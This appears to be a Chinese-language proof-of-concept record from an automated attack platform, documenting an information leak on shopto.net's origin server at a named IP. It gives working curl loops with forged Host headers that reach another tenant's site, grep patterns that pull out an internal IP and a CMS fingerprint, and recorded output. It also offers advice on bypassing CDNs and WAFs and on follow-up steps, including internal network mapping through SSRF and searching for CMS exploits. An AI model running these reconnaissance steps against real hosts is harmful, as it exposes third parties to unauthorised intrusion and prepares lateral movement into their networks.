# shopto.net 源站 3.8.196.174 默认 vhost 的 /error 泄露异租户站点 + 内网 IP(192.168.56.180) + CMS 指纹(DcCMS 2015)

- **code**: shopto-origin-default-vhost-error-path-crosstenant-leak-dccm
- **kind**: poc
- **category**: info-leak
- **component**: DcCMS 2015 (dynamic commerce GmbH, www.dc-solution.de) / nginx 默认 vhost / 多租户 dcshop 共置
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 14:35 UTC，ARTEX 执行机用 curl（经平台记录代理）打 shopto.net 源站 3.8.196.174，执行 `curl -sk --http1.0 -H 'Host: localhost' https://3.8.196.174/error` → HTTP/1.0 200、26982 字节；正文与主站不同：HTML 注释 `<!-- DcCMS 2015 ... GmbH www.dc-solution.de -->`（DcCMS 产品/厂商指纹），`<link rel='canonical' href='https://192.168.56.180/b2c/de/home/'/>`（内网主机 IP），title 为另一租户的德语高尔夫商城。据此判定：默认 vhost（Host 非真实域名）未做隔离，/error 直接落到同 docroot 下异租户站点，跨租户内容 + 内网 IP + CMS 指纹三泄露同时成立。
- **path**: pocs/shopto-origin-default-vhost-error-path-crosstenant-leak-dccm/poc.md
- **tags**: info-expose,info-leak,dc shop,多租户,默认vhost,host头,内网ip泄露,cms指纹,dccms,源站,shopto.net,recon
- **created_at**: 2026-11-11T14:46:28.456Z
- **engine**: 3.8.196.174（shopto.net 源站，https://3.8.196.174）

## 描述

原理：源站 nginx 上 shopto.net 与另一台租户商城共置，且默认/兜底 server 未做 Host 白名单与 docroot 隔离。用非真实域名（localhost、或不存在的主机名）当 Host 请求源站裸 IP，即落到默认 vhost，直接返回**另一租户站点**的首页/错误页，从而：① 泄露异租户内容与站点身份；② 页面 canonical/绝对 URL 里带出**内网主机 IP**（本环境为 192.168.56.180），可作内网拓扑入口；③ 页脚 CMS 注释暴露**产品与厂商指纹**（DcCMS 2015 / dynamic commerce GmbH / www.dc-solution.de），据此可去查该 CMS 的公开漏洞。适用面：任何"源站 IP 可达 + 多站共置 + 默认 vhost 不隔离"的目标，属低成本高信噪比的侦察/信息泄露面。

## 用法

```
前置：能直连源站 IP 的 443（3.8.196.174:443），curl 带 -k 忽略证书；部分站点需 HTTP/1.0。

【1) 基线：正常 Host 打源站，确认打到主站】
curl -sk --http1.0 -H 'Host: shopto.net'    https://3.8.196.174/ -o base.html -w 'base %{http_code} %{size_download}\n'

【2) 用非真实 Host 触发默认 vhost（关键一步）】
for H in localhost 127.0.0.1 notexist.invalid; do
  curl -sk --http1.0 -H "Host: $H" https://3.8.196.174/error \
       -o "rt_$H.html" -w "Host=$H %{http_code} %{size_download}\n"
  head -c 400 "rt_$H.html"; echo; echo ---
done

【3) 判据（同时看三样，才算成立）】
# a. 响应 200 且体积/内容与基线不同 => 命中另一个站点（异租户）
# b. 页面里线上线下的内网/绝对地址：
grep -Eio "https?://(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9.]+[^\"'<> ]*" rt_localhost.html
# c. CMS 指纹（本例页脚 HTML 注释）：
grep -Eio "DcCMS[^>]*|dc-solution\.de|[A-Za-z]+CMS *[0-9]{4}" rt_localhost.html

【4) 加固/绕行要点】
- 若 Host 被边缘/CDN 拦：先按 TLS 证书 SAN / 子域枚举找到**不走 CDN 的源站 IP**，再直连源站发 Host（参见库内 TLS 证书 SAN 反查 + Host 头路由手法）。
- 若统一返回 404/主站内容：说明默认 server 有 Host 白名单或 /error 真实存在被业务接管，换 /404、/、随机路径再试。
- HTTP/1.0 是关键：部分默认 server 只在 HTTP/1.0 或非 SNI 下回退到兜底站点。

【失败常见原因】Host 白名单生效；站点各自独立 docroot 不共置；源站仅在内网可达；/error 被 WAF 拦。
```

## 正文

```
# shopto.net 源站默认 vhost /error 跨租户泄露（info-expose / info-leak）

## 目标
- 源站：`3.8.196.174`（shopto.net 解析出口之外的真实源站 IP，443 开放）
- 入口：`https://3.8.196.174/error`，伪造 Host 触发默认 vhost

## 复现（实测）
```bash
curl -sk --http1.0 -H 'Host: localhost' https://3.8.196.174/error
```

回显（2026-11-11 14:35 UTC，HTTP/1.0 200，26982 字节）：
```
HTTP/1.0 200 OK
... (正文为另一租户的德语高尔夫商城首页，非 shopto.net 内容)

<!-- DcCMS 2015 ... GmbH www.dc-solution.de -->
<link rel='canonical' href='https://192.168.56.180/b2c/de/home/'/>
<title>... | Golf-Equipment online kaufen | ...</title>
```

（注：CMS 页脚厂商串在采集链路上被打码为「dynamic commerce GmbH」→ 记录时已还原为厂商名，来源即 `www.dc-solution.de`，DcCMS = Dynamic Commerce CMS 2015。）

## 三条命中信号
1. **跨租户内容**：`Host: localhost` 下 `/error` 返回 200，正文是**另一个租户**的站点（与 `Host: shopto.net` 基线对比 volume/内容即知）。
2. **内网 IP 泄露**：canonical 绝对地址里出现内网主机 `192.168.56.180`（`/b2c/de/home/`），可作内网拓扑/后续横向的起点。
3. **CMS 产品与厂商指纹**：HTML 注释 `DcCMS 2015 ... www.dc-solution.de`，可据此检索该 CMS 公开漏洞。

## 根因
源站多站共置（shopto.net 与另一租户 dcshop/DcCMS 站点同机），**默认 vhost 未做 Host 白名单与 docroot 隔离**，非真实 Host 请求直接落到兜底站点，且 `/error` 未真正存在、被默认 server 兜底到站点首页。

## 后续可延展
- 用 TLS 证书 SAN / 子域枚举定位**不走 CDN 的源站 IP**，再逐个 Host 反打源站，找更多隐藏 vhost。
- 按 DcCMS 2015 检索公开漏洞（该 CMS 属小众德系电商程序，历史上后台/参数类问题较多）。
- 内网 IP `192.168.56.180` 记入内网资产线索，配合 SSRF/回显类漏洞做内网测绘。

```
